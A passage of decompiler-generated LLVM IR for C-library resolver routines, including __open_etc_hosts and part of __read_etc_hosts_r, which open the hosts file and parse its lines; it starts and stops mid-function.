  store i32 %v2_10013ff0, i32* @r28, align 4
  %v1_10013ff4 = load i32, i32* @r29, align 4
  %v2_10013ff4 = sub i32 %v1_10013ff4, %v2_10013ff0
  %v1_10013ff8 = add i32 %v2_10013ff4, -10
  br i1 %v1_10013fec, label %dec_label_pc_100140b4, label %dec_label_pc_10014004

dec_label_pc_10014004:                            ; preds = %entry
  %v0_10014008 = load i32, i32* @r26, align 4
  %v2_10014008 = add i32 %v0_10014008, %v2_10013ff0
  store i32 %v2_10014008, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_10013ff8, -1
  br i1 %tmp6, label %dec_label_pc_10014018, label %dec_label_pc_10014010

dec_label_pc_10014010:                            ; preds = %dec_label_pc_10014004
  store i32 %v1_10013ff8, i32* @r27, align 4
  br label %dec_label_pc_100140b4

dec_label_pc_10014018:                            ; preds = %dec_label_pc_10014004
  store i32 268517404, i32* @lr, align 4
  %v1_10014018 = call i32 @__GI_strdup(i32 %v2_10013fc8)
  %v0_1001401c = load i32, i32* @r30, align 4
  %v1_1001401c = add i32 %v0_1001401c, 2
  store i32 %v1_1001401c, i32* %r8.global-to-local, align 4
  %v1_10014020 = load i32, i32* @r31, align 4
  %v2_10014020 = inttoptr i32 %v1_10014020 to i32*
  store i32 %v1_10014018, i32* %v2_10014020, align 4
  %v0_10014024 = load i32, i32* %r8.global-to-local, align 4
  %v1_10014024 = add i32 %v0_10014024, 2
  store i32 %v1_10014024, i32* %r10.global-to-local, align 4
  %v0_10014028 = load i32, i32* @r30, align 4
  %v1_10014028 = add i32 %v0_10014028, 10
  store i32 %v1_10014028, i32* %r6.global-to-local, align 4
  %v0_1001402c = load i32, i32* @r26, align 4
  %v1_1001402c = load i32, i32* @r28, align 4
  %v2_1001402c = add i32 %v1_1001402c, %v0_1001402c
  %v3_1001402c = inttoptr i32 %v2_1001402c to i8*
  %v4_1001402c = load i8, i8* %v3_1001402c, align 1
  %v5_1001402c = zext i8 %v4_1001402c to i32
  store i32 %v5_1001402c, i32* %r0.global-to-local, align 4
  %v1_10014030 = add i32 %v0_10014028, 1
  %v2_10014030 = inttoptr i32 %v1_10014030 to i8*
  %v3_10014030 = load i8, i8* %v2_10014030, align 1
  %v4_10014030 = zext i8 %v3_10014030 to i32
  store i32 %v4_10014030, i32* %r9.global-to-local, align 4
  %v1_10014034 = mul nuw nsw i32 %v5_1001402c, 256
  %v2_10014038 = or i32 %v4_10014030, %v1_10014034
  store i32 %v2_10014038, i32* %r0.global-to-local, align 4
  %v1_1001403c = load i32, i32* @r31, align 4
  %v2_1001403c = add i32 %v1_1001403c, 4
  %v3_1001403c = inttoptr i32 %v2_1001403c to i32*
  store i32 %v2_10014038, i32* %v3_1001403c, align 4
  %v0_10014040 = load i32, i32* @r30, align 4
  %v1_10014040 = add i32 %v0_10014040, 2
  %v2_10014040 = inttoptr i32 %v1_10014040 to i8*
  %v3_10014040 = load i8, i8* %v2_10014040, align 1
  %v4_10014040 = zext i8 %v3_10014040 to i32
  store i32 %v4_10014040, i32* %r0.global-to-local, align 4
  %v0_10014044 = load i32, i32* %r8.global-to-local, align 4
  %v1_10014044 = add i32 %v0_10014044, 1
  %v2_10014044 = inttoptr i32 %v1_10014044 to i8*
  %v3_10014044 = load i8, i8* %v2_10014044, align 1
  %v4_10014044 = zext i8 %v3_10014044 to i32
  store i32 %v4_10014044, i32* %r9.global-to-local, align 4
  %v1_10014048 = mul nuw nsw i32 %v4_10014040, 256
  %v2_1001404c = or i32 %v4_10014044, %v1_10014048
  store i32 %v2_1001404c, i32* %r0.global-to-local, align 4
  %v1_10014050 = load i32, i32* @r31, align 4
  %v2_10014050 = add i32 %v1_10014050, 8
  %v3_10014050 = inttoptr i32 %v2_10014050 to i32*
  store i32 %v2_1001404c, i32* %v3_10014050, align 4
  %v0_10014054 = load i32, i32* %r8.global-to-local, align 4
  %v1_10014054 = add i32 %v0_10014054, 2
  %v2_10014054 = inttoptr i32 %v1_10014054 to i8*
  %v3_10014054 = load i8, i8* %v2_10014054, align 1
  %v4_10014054 = zext i8 %v3_10014054 to i32
  store i32 %v4_10014054, i32* %r0.global-to-local, align 4
  %v0_10014058 = load i32, i32* %r10.global-to-local, align 4
  %v1_10014058 = add i32 %v0_10014058, 1
  %v2_10014058 = inttoptr i32 %v1_10014058 to i8*
  %v3_10014058 = load i8, i8* %v2_10014058, align 1
  %v4_10014058 = zext i8 %v3_10014058 to i32
  store i32 %v4_10014058, i32* %r11.global-to-local, align 4
  %v1_1001405c = add i32 %v0_10014058, 3
  %v2_1001405c = inttoptr i32 %v1_1001405c to i8*
  %v3_1001405c = load i8, i8* %v2_1001405c, align 1
  %v4_1001405c = zext i8 %v3_1001405c to i32
  %v1_10014060 = mul nuw i32 %v4_10014054, 16777216
  store i32 %v1_10014060, i32* %r0.global-to-local, align 4
  %v1_10014064 = add i32 %v0_10014058, 2
  %v2_10014064 = inttoptr i32 %v1_10014064 to i8*
  %v3_10014064 = load i8, i8* %v2_10014064, align 1
  %v4_10014064 = zext i8 %v3_10014064 to i32
  %v1_10014068 = mul nuw nsw i32 %v4_10014058, 65536
  %v2_1001406c = or i32 %v1_10014068, %v1_10014060
  %v0_10014070 = load i32, i32* @r28, align 4
  %v1_10014070 = add i32 %v0_10014070, 10
  store i32 %v1_10014070, i32* %r11.global-to-local, align 4
  %v2_10014074 = or i32 %v2_1001406c, %v4_1001405c
  store i32 %v2_10014074, i32* %r0.global-to-local, align 4
  %v1_10014078 = mul nuw nsw i32 %v4_10014064, 256
  %v2_1001407c = or i32 %v1_10014078, %v2_10014074
  store i32 %v2_1001407c, i32* %r9.global-to-local, align 4
  %v1_10014080 = load i32, i32* @r31, align 4
  %v2_10014080 = add i32 %v1_10014080, 12
  %v3_10014080 = inttoptr i32 %v2_10014080 to i32*
  store i32 %v2_1001407c, i32* %v3_10014080, align 4
  %v0_10014084 = load i32, i32* %r8.global-to-local, align 4
  %v1_10014084 = add i32 %v0_10014084, 6
  %v2_10014084 = inttoptr i32 %v1_10014084 to i8*
  %v3_10014084 = load i8, i8* %v2_10014084, align 1
  %v4_10014084 = zext i8 %v3_10014084 to i32
  store i32 %v4_10014084, i32* %r9.global-to-local, align 4
  %v0_10014088 = load i32, i32* @r30, align 4
  %v1_10014088 = add i32 %v0_10014088, 9
  %v2_10014088 = inttoptr i32 %v1_10014088 to i8*
  %v3_10014088 = load i8, i8* %v2_10014088, align 1
  %v4_10014088 = zext i8 %v3_10014088 to i32
  store i32 %v4_10014088, i32* %r0.global-to-local, align 4
  %v1_1001408c = mul nuw nsw i32 %v4_10014084, 256
  store i32 %v1_1001408c, i32* %r9.global-to-local, align 4
  %v0_10014090 = load i32, i32* %r11.global-to-local, align 4
  %v1_10014090 = load i32, i32* @r31, align 4
  %v2_10014090 = add i32 %v1_10014090, 24
  %v3_10014090 = inttoptr i32 %v2_10014090 to i32*
  store i32 %v0_10014090, i32* %v3_10014090, align 4
  %v0_10014094 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014094 = load i32, i32* %r0.global-to-local, align 4
  %v2_10014094 = or i32 %v1_10014094, %v0_10014094
  store i32 %v2_10014094, i32* %r9.global-to-local, align 4
  %v0_10014098 = load i32, i32* %r6.global-to-local, align 4
  %v1_10014098 = load i32, i32* @r31, align 4
  %v2_10014098 = add i32 %v1_10014098, 20
  %v3_10014098 = inttoptr i32 %v2_10014098 to i32*
  store i32 %v0_10014098, i32* %v3_10014098, align 4
  %v0_1001409c = load i32, i32* @r29, align 4
  %v1_1001409c = load i32, i32* %r9.global-to-local, align 4
  %v2_1001409c = icmp slt i32 %v0_1001409c, %v1_1001409c
  %v1_100140a0 = add i32 %v1_1001409c, 10
  store i32 %v1_100140a0, i32* %r0.global-to-local, align 4
  %v0_100140a4 = load i32, i32* @r27, align 4
  %v2_100140a4 = add i32 %v0_100140a4, %v1_100140a0
  store i32 %v2_100140a4, i32* @r27, align 4
  %v1_100140a8 = load i32, i32* @r31, align 4
  %v2_100140a8 = add i32 %v1_100140a8, 16
  %v3_100140a8 = inttoptr i32 %v2_100140a8 to i32*
  store i32 %v1_1001409c, i32* %v3_100140a8, align 4
  br i1 %v2_1001409c, label %dec_label_pc_100140b0, label %dec_label_pc_10014018.dec_label_pc_100140b4_crit_edge

dec_label_pc_10014018.dec_label_pc_100140b4_crit_edge: ; preds = %dec_label_pc_10014018
  %v0_100140b8.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_100140b4

dec_label_pc_100140b0:                            ; preds = %dec_label_pc_10014018
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_100140b4

dec_label_pc_100140b4:                            ; preds = %dec_label_pc_10014018.dec_label_pc_100140b4_crit_edge, %entry, %dec_label_pc_10014010, %dec_label_pc_100140b0
  %v0_100140b8 = phi i32 [ %v0_100140b8.pre, %dec_label_pc_10014018.dec_label_pc_100140b4_crit_edge ], [ %v2_10013fe8, %entry ], [ %v1_10013ff8, %dec_label_pc_10014010 ], [ -1, %dec_label_pc_100140b0 ]
  store i32 %v0_10013fc0, i32* %r0.global-to-local, align 4
  ret i32 %v0_100140b8

; uselistorder directives
  uselistorder i32 %v1_1001409c, { 1, 0, 2 }
  uselistorder i32 %v1_10014060, { 1, 0 }
  uselistorder i32 %v1_10013ff8, { 1, 2, 0 }
  uselistorder i32 %v2_10013fe8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10013fc8, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32 20, { 30, 31, 32, 33, 1, 12, 34, 35, 13, 14, 15, 16, 5, 6, 28, 7, 0, 40, 41, 17, 18, 19, 20, 21, 23, 24, 22, 39, 36, 8, 9, 10, 11, 25, 26, 27, 4, 29, 2, 3, 37, 38 }
  uselistorder i32 9, { 18, 19, 20, 21, 1, 9, 2, 10, 3, 11, 0, 12, 13, 14, 15, 16, 4, 5, 6, 7, 8, 17, 22, 23, 24 }
  uselistorder i32 65536, { 0, 35, 1, 2, 3, 4, 6, 5, 7, 8, 9, 38, 10, 11, 36, 13, 12, 14, 37, 15, 17, 16, 18, 20, 19, 21, 22, 23, 26, 25, 24, 28, 29, 27, 30, 32, 33, 31, 34 }
  uselistorder i32 3, { 47, 48, 49, 50, 51, 52, 53, 54, 55, 1, 38, 2, 0, 8, 18, 20, 19, 10, 21, 57, 9, 63, 3, 58, 59, 39, 40, 22, 41, 42, 23, 24, 25, 26, 27, 35, 37, 64, 65, 36, 68, 45, 14, 4, 5, 60, 66, 67, 6, 73, 74, 75, 69, 70, 71, 72, 12, 44, 43, 56, 7, 13, 46, 15, 28, 16, 29, 30, 61, 62, 31, 32, 33, 17, 34, 11 }
  uselistorder i32 (i32)* @__GI_strdup, { 0, 2, 1 }
  uselistorder i32 -10, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 256, { 0, 1, 2, 3, 46, 52, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 44, 16, 17, 18, 19, 20, 21, 22, 23, 49, 24, 50, 51, 55, 25, 26, 27, 28, 29, 54, 47, 30, 31, 32, 33, 53, 34, 35, 36, 37, 38, 39, 40, 45, 48, 41, 42, 43 }
  uselistorder label %dec_label_pc_100140b4, { 3, 0, 2, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v0_100140d0 = load i32, i32* @lr, align 4
  store i32 268517620, i32* @lr, align 4
  %v3_100140f0 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_10017bc0.721 to i32), i32 ptrtoint (i32* @global_var_10017b5c.691 to i32))
  %v3_100140f8 = icmp eq i32 %v3_100140f0, 0
  br i1 %v3_100140f8, label %dec_label_pc_10014100, label %dec_label_pc_1001411c

dec_label_pc_10014100:                            ; preds = %entry
  %v0_100140f4 = load i32, i32* @r29, align 4
  store i32 %v0_100140d0, i32* @lr, align 4
  %v3_10014118 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_10017bcc.722 to i32), i32 %v0_100140f4)
  br label %dec_label_pc_1001411c

dec_label_pc_1001411c:                            ; preds = %entry, %dec_label_pc_10014100
  %v0_1001412c = phi i32 [ %v3_100140f0, %entry ], [ %v3_10014118, %dec_label_pc_10014100 ]
  ret i32 %v0_1001412c

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 6, 0, 2, 1, 5, 4, 3 }
  uselistorder label %dec_label_pc_1001411c, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_10014130 = load i32, i32* @lr, align 4
  store i32 %arg6, i32* @r30, align 4
  %v1_10014144 = sub i32 0, %arg6
  %v1_10014148 = urem i32 %v1_10014144, 4
  store i32 %v1_10014148, i32* %r0.global-to-local, align 4
  %v3_10014148 = icmp eq i32 %v1_10014148, 0
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  store i32 %arg4, i32* %r18.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_10014160 = load i32, i32* @r10, align 4
  store i32 %v0_10014160, i32* %r17.global-to-local, align 4
  store i32 %arg8, i32* %r16.global-to-local, align 4
  %v0_1001417c.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_10014148, label %dec_label_pc_1001417c, label %dec_label_pc_1001416c

dec_label_pc_1001416c:                            ; preds = %entry
  %v2_1001416c = icmp ult i32 %v0_1001417c.pr, %v1_10014148
  br i1 %v2_1001416c, label %dec_label_pc_10014430, label %dec_label_pc_10014174

dec_label_pc_10014174:                            ; preds = %dec_label_pc_1001416c
  %v2_10014174 = sub i32 %v0_1001417c.pr, %v1_10014148
  store i32 %v2_10014174, i32* %r9.global-to-local, align 4
  %v2_10014178 = add i32 %v1_10014148, %arg6
  store i32 %v2_10014178, i32* @r30, align 4
  br label %dec_label_pc_1001417c

dec_label_pc_1001417c:                            ; preds = %entry, %dec_label_pc_10014174
  %v0_10014188 = phi i32 [ %v2_10014178, %dec_label_pc_10014174 ], [ %arg6, %entry ]
  %v0_1001418c = phi i32 [ %v2_10014174, %dec_label_pc_10014174 ], [ %v0_1001417c.pr, %entry ]
  %tmp49 = icmp ult i32 %v0_1001418c, 32
  br i1 %tmp49, label %dec_label_pc_10014430, label %dec_label_pc_10014184

dec_label_pc_10014184:                            ; preds = %dec_label_pc_1001417c
  %v3_10014184 = icmp eq i32 %arg4, 1
  %v1_10014188 = add i32 %v0_10014188, 32
  store i32 %v1_10014188, i32* @r24, align 4
  %v1_1001418c = add i32 %v0_1001418c, -32
  store i32 %v1_1001418c, i32* @r27, align 4
  br i1 %v3_10014184, label %dec_label_pc_1001428c, label %dec_label_pc_10014194

dec_label_pc_10014194:                            ; preds = %dec_label_pc_10014184
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1001419c = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_1001419c, align 4
  %tmp50 = icmp ult i32 %v1_1001418c, 4
  br i1 %tmp50, label %dec_label_pc_10014430, label %dec_label_pc_100141a4

dec_label_pc_100141a4:                            ; preds = %dec_label_pc_10014194
  %v0_100141a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100141a4 = add i32 %v0_100141a4, -36
  store i32 %v1_100141a4, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_100141a4, 8
  br i1 %tmp51, label %dec_label_pc_10014430, label %dec_label_pc_100141b0

dec_label_pc_100141b0:                            ; preds = %dec_label_pc_100141a4
  %v0_100141b0 = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_100141b0, 16
  br i1 %tmp52, label %dec_label_pc_10014430, label %dec_label_pc_100141b8

dec_label_pc_100141b8:                            ; preds = %dec_label_pc_100141b0
  %v1_100141b8 = add i32 %v0_100141a4, -48
  store i32 %v1_100141b8, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_100141b8, 8
  br i1 %tmp53, label %dec_label_pc_10014430, label %dec_label_pc_100141c4

dec_label_pc_100141c4:                            ; preds = %dec_label_pc_100141b8
  %v1_100141c4 = add i32 %v0_100141a4, -56
  store i32 %v1_100141c4, i32* %r0.global-to-local, align 4
  %v1_100141c8 = add i32 %v0_100141a4, -44
  store i32 %v1_100141c8, i32* @r27, align 4
  %v3_100141cc = icmp ugt i32 %v1_100141c4, %v1_100141c8
  %v0_100141d0 = load i32, i32* @r30, align 4
  %v1_100141d0 = add i32 %v0_100141d0, 36
  store i32 %v1_100141d0, i32* @r29, align 4
  %v1_100141d4 = add i32 %v0_100141d0, 48
  store i32 %v1_100141d4, i32* @r26, align 4
  br i1 %v3_100141cc, label %dec_label_pc_100141e8, label %dec_label_pc_100141e0

dec_label_pc_100141e0:                            ; preds = %dec_label_pc_100141c4
  store i32 %v1_100141c4, i32* @r27, align 4
  br label %dec_label_pc_100141e8

dec_label_pc_100141e8:                            ; preds = %dec_label_pc_100141c4, %dec_label_pc_100141e0
  %v0_100141e8 = phi i32 [ %v1_100141c4, %dec_label_pc_100141e0 ], [ %v1_100141c8, %dec_label_pc_100141c4 ]
  %tmp54 = icmp ult i32 %v0_100141e8, 80
  br i1 %tmp54, label %dec_label_pc_10014430, label %dec_label_pc_100141f0

dec_label_pc_100141f0:                            ; preds = %dec_label_pc_100141e8
  store i32 268517876, i32* @lr, align 4
  %v0_100141f0 = call i32 @__open_etc_hosts()
  store i32 %v0_100141f0, i32* @r20, align 4
  %v3_100141f4 = icmp eq i32 %v0_100141f0, 0
  br i1 %v3_100141f4, label %dec_label_pc_10014214, label %dec_label_pc_100141fc

dec_label_pc_100141fc:                            ; preds = %dec_label_pc_100141f0
  %v0_100141fc = load i32, i32* @r24, align 4
  store i32 %v0_100141fc, i32* @r25, align 4
  %v0_10014204 = load i32, i32* @r26, align 4
  store i32 %v0_10014204, i32* @r23, align 4
  %v0_10014208 = load i32, i32* @r31, align 4
  store i32 %v0_10014208, i32* @r24, align 4
  store i32 %v0_100141fc, i32* %r21.global-to-local, align 4
  %v1_100142a4.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1001429c

dec_label_pc_10014214:                            ; preds = %dec_label_pc_100141f0
  %v1_10014214 = load i32, i32* %r17.global-to-local, align 4
  %v2_10014214 = inttoptr i32 %v1_10014214 to i32*
  store i32 0, i32* %v2_10014214, align 4
  %v0_10014218 = call i32 @__errno_location()
  %v1_1001421c = inttoptr i32 %v0_10014218 to i32*
  %v2_1001421c = load i32, i32* %v1_1001421c, align 4
  store i32 %v2_1001421c, i32* @r26, align 4
  br label %dec_label_pc_10014434

dec_label_pc_10014224:                            ; preds = %dec_label_pc_100143c4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10014228 = load i32, i32* @r25, align 4
  %v1_10014228 = load i32, i32* @r22, align 4
  %v2_10014228 = inttoptr i32 %v1_10014228 to i32*
  store i32 %v0_10014228, i32* %v2_10014228, align 4
  %v0_1001422c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001422c = load i32, i32* @r22, align 4
  %v2_1001422c = add i32 %v1_1001422c, 4
  %v3_1001422c = inttoptr i32 %v2_1001422c to i32*
  store i32 %v0_1001422c, i32* %v3_1001422c, align 4
  %v0_10014230 = load i32, i32* @r30, align 4
  %v1_10014230 = add i32 %v0_10014230, 8
  store i32 %v1_10014230, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_10014238 = add i32 %v0_10014230, 4
  %v2_10014238 = inttoptr i32 %v1_10014238 to i32*
  %v3_10014238 = load i32, i32* %v2_10014238, align 4
  store i32 %v3_10014238, i32* %r0.global-to-local, align 4
  %v0_1001423c = load i32, i32* %r19.global-to-local, align 4
  %v1_1001423c = load i32, i32* @r28, align 4
  %v2_1001423c = add i32 %v1_1001423c, 8
  %v3_1001423c = inttoptr i32 %v2_1001423c to i32*
  store i32 %v0_1001423c, i32* %v3_1001423c, align 4
  %v0_10014240 = load i32, i32* %r0.global-to-local, align 4
  %v1_10014240 = load i32, i32* @r28, align 4
  %v2_10014240 = inttoptr i32 %v1_10014240 to i32*
  store i32 %v0_10014240, i32* %v2_10014240, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10014248 = load i32, i32* @r28, align 4
  %v2_10014248 = add i32 %v1_10014248, 12
  %v3_10014248 = inttoptr i32 %v2_10014248 to i32*
  store i32 4, i32* %v3_10014248, align 4
  %v0_1001424c = load i32, i32* @r22, align 4
  %v1_1001424c = load i32, i32* @r28, align 4
  %v2_1001424c = add i32 %v1_1001424c, 16
  %v3_1001424c = inttoptr i32 %v2_1001424c to i32*
  store i32 %v0_1001424c, i32* %v3_1001424c, align 4
  br label %dec_label_pc_10014280

dec_label_pc_10014254:                            ; preds = %dec_label_pc_100143e8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10014258 = load i32, i32* %r21.global-to-local, align 4
  %v1_10014258 = load i32, i32* @r23, align 4
  %v2_10014258 = inttoptr i32 %v1_10014258 to i32*
  store i32 %v0_10014258, i32* %v2_10014258, align 4
  %v0_1001425c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001425c = load i32, i32* @r23, align 4
  %v2_1001425c = add i32 %v1_1001425c, 4
  %v3_1001425c = inttoptr i32 %v2_1001425c to i32*
  store i32 %v0_1001425c, i32* %v3_1001425c, align 4
  %v0_10014260 = load i32, i32* @r30, align 4
  %v1_10014260 = add i32 %v0_10014260, 8
  store i32 %v1_10014260, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_10014268 = add i32 %v0_10014260, 4
  %v2_10014268 = inttoptr i32 %v1_10014268 to i32*
  %v3_10014268 = load i32, i32* %v2_10014268, align 4
  store i32 %v3_10014268, i32* %r0.global-to-local, align 4
  %v0_1001426c = load i32, i32* %r19.global-to-local, align 4
  %v1_1001426c = load i32, i32* @r28, align 4
  %v2_1001426c = add i32 %v1_1001426c, 8
  %v3_1001426c = inttoptr i32 %v2_1001426c to i32*
  store i32 %v0_1001426c, i32* %v3_1001426c, align 4
  %v0_10014270 = load i32, i32* %r0.global-to-local, align 4
  %v1_10014270 = load i32, i32* @r28, align 4
  %v2_10014270 = inttoptr i32 %v1_10014270 to i32*
  store i32 %v0_10014270, i32* %v2_10014270, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_10014278 = load i32, i32* @r28, align 4
  %v2_10014278 = add i32 %v1_10014278, 12
  %v3_10014278 = inttoptr i32 %v2_10014278 to i32*
  store i32 16, i32* %v3_10014278, align 4
  %v0_1001427c = load i32, i32* @r23, align 4
  %v1_1001427c = load i32, i32* @r28, align 4
  %v2_1001427c = add i32 %v1_1001427c, 16
  %v3_1001427c = inttoptr i32 %v2_1001427c to i32*
  store i32 %v0_1001427c, i32* %v3_1001427c, align 4
  br label %dec_label_pc_10014280

dec_label_pc_10014280:                            ; preds = %dec_label_pc_10014224, %dec_label_pc_10014254
  %v0_10014280 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014280 = load i32, i32* @r28, align 4
  %v2_10014280 = add i32 %v1_10014280, 4
  %v3_10014280 = inttoptr i32 %v2_10014280 to i32*
  store i32 %v0_10014280, i32* %v3_10014280, align 4
  %v0_10014284 = load i32, i32* @r28, align 4
  %v1_10014284 = load i32, i32* %r17.global-to-local, align 4
  %v2_10014284 = inttoptr i32 %v1_10014284 to i32*
  store i32 %v0_10014284, i32* %v2_10014284, align 4
  br label %dec_label_pc_1001441c

dec_label_pc_1001428c:                            ; preds = %dec_label_pc_10014184
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %r21.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_1001429c

dec_label_pc_1001429c:                            ; preds = %dec_label_pc_100141fc, %dec_label_pc_1001428c
  %v1_100142a4 = phi i32 [ %v1_100142a4.pre, %dec_label_pc_100141fc ], [ %arg8, %dec_label_pc_1001428c ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_100142a4 = inttoptr i32 %v1_100142a4 to i32*
  store i32 1, i32* %v2_100142a4, align 4
  br label %dec_label_pc_10014404

dec_label_pc_100142ac:                            ; preds = %dec_label_pc_10014404
  %v0_100142ac = load i32, i32* @r24, align 4
  store i32 %v0_100142ac, i32* @r3, align 4
  store i32 268518072, i32* @lr, align 4
  %v2_100142b4 = call i32 @__GI_strchr(i32 %v0_100142ac, i32 35)
  %v4_100142b8 = icmp eq i32 %v2_100142b4, 0
  br i1 %v4_100142b8, label %dec_label_pc_100142c8, label %dec_label_pc_100142c0

dec_label_pc_100142c0:                            ; preds = %dec_label_pc_100142ac
  %v3_100142b4 = inttoptr i32 %v2_100142b4 to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_100142b4, align 1
  br label %dec_label_pc_100142c8

dec_label_pc_100142c8:                            ; preds = %dec_label_pc_100142ac, %dec_label_pc_100142c0
  %v0_100142c8 = load i32, i32* @r24, align 4
  store i32 %v0_100142c8, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_1001434417 = inttoptr i32 %v0_100142c8 to i8*
  %v2_1001434418 = load i8, i8* %v1_1001434417, align 1
  %v3_1001434419 = zext i8 %v2_1001434418 to i32
  store i32 %v3_1001434419, i32* %r0.global-to-local, align 4
  %v3_1001434821 = icmp eq i8 %v2_1001434418, 0
  br i1 %v3_1001434821, label %dec_label_pc_10014350, label %dec_label_pc_100142e0.preheader

dec_label_pc_100142d4:                            ; preds = %dec_label_pc_100142f0
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_100142d8 = inttoptr i32 %v0_10014314 to i8*
  store i8 0, i8* %v3_100142d8, align 1
  %v0_100142dc = load i32, i32* %r11.global-to-local, align 4
  %v1_100142dc = add i32 %v0_100142dc, 1
  store i32 %v1_100142dc, i32* %r11.global-to-local, align 4
  %v1_100142e0 = inttoptr i32 %v1_100142dc to i8*
  %v2_100142e0 = load i8, i8* %v1_100142e0, align 1
  %v3_100142e0 = zext i8 %v2_100142e0 to i32
  store i32 %v3_100142e0, i32* %r0.global-to-local, align 4
  %v3_100142e4 = icmp eq i8 %v2_100142e0, 0
  br i1 %v3_100142e4, label %dec_label_pc_10014350, label %dec_label_pc_100142f0

dec_label_pc_100142f0:                            ; preds = %dec_label_pc_100142e0.preheader, %dec_label_pc_100142d4
  %v0_10014314 = phi i32 [ %v1_100142dc, %dec_label_pc_100142d4 ], [ %v0_100142e02, %dec_label_pc_100142e0.preheader ]
  %v0_100142f8.in = phi i32 [ %v3_100142e0, %dec_label_pc_100142d4 ], [ %v3_100142e05, %dec_label_pc_100142e0.preheader ]
  %v0_100142f8 = mul nuw nsw i32 %v0_100142f8.in, 2
  %v3_100142f4 = load i32, i32* @global_var_10028578, align 4
  store i32 %v3_100142f4, i32* %r9.global-to-local, align 4
  %v2_100142f8 = add i32 %v3_100142f4, %v0_100142f8
  %v3_100142f8 = inttoptr i32 %v2_100142f8 to i16*
  %v4_100142f8 = load i16, i16* %v3_100142f8, align 2
  %v5_100142f8 = zext i16 %v4_100142f8 to i32
  store i32 %v5_100142f8, i32* %r0.global-to-local, align 4
  %v1_100142fc = and i32 %v5_100142f8, 32
  store i32 %v1_100142fc, i32* %r9.global-to-local, align 4
  %v3_100142fc = icmp eq i32 %v1_100142fc, 0
  br i1 %v3_100142fc, label %dec_label_pc_10014304, label %dec_label_pc_100142d4

dec_label_pc_10014304:                            ; preds = %dec_label_pc_100142f0
  %v0_10014304 = load i32, i32* @r29, align 4
  %v2_10014304 = icmp sgt i32 %v0_10014304, 6
  br i1 %v2_10014304, label %dec_label_pc_10014320.preheader, label %dec_label_pc_1001430c

dec_label_pc_1001430c:                            ; preds = %dec_label_pc_10014304
  %v1_1001430c = mul i32 %v0_10014304, 4
  store i32 %v1_1001430c, i32* %r0.global-to-local, align 4
  %v1_10014310 = add i32 %v0_10014304, 1
  store i32 %v1_10014310, i32* @r29, align 4
  %v1_10014314 = load i32, i32* @r30, align 4
  %v3_10014314 = add i32 %v1_10014314, %v1_1001430c
  %v4_10014314 = inttoptr i32 %v3_10014314 to i32*
  store i32 %v0_10014314, i32* %v4_10014314, align 4
  %v0_100143209.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10014320.preheader

dec_label_pc_10014320.preheader:                  ; preds = %dec_label_pc_1001430c, %dec_label_pc_10014304
  %v0_100143209 = phi i32 [ %v0_100143209.pre, %dec_label_pc_1001430c ], [ %v0_10014314, %dec_label_pc_10014304 ]
  %v1_1001432010 = inttoptr i32 %v0_100143209 to i8*
  %v2_1001432011 = load i8, i8* %v1_1001432010, align 1
  %v3_1001432012 = zext i8 %v2_1001432011 to i32
  store i32 %v3_1001432012, i32* %r0.global-to-local, align 4
  %v3_1001432414 = icmp eq i8 %v2_1001432011, 0
  br i1 %v3_1001432414, label %dec_label_pc_10014344.loopexit, label %dec_label_pc_10014330.lr.ph

dec_label_pc_10014330.lr.ph:                      ; preds = %dec_label_pc_10014320.preheader
  %v3_10014334.pre = load i32, i32* @global_var_10028578, align 4
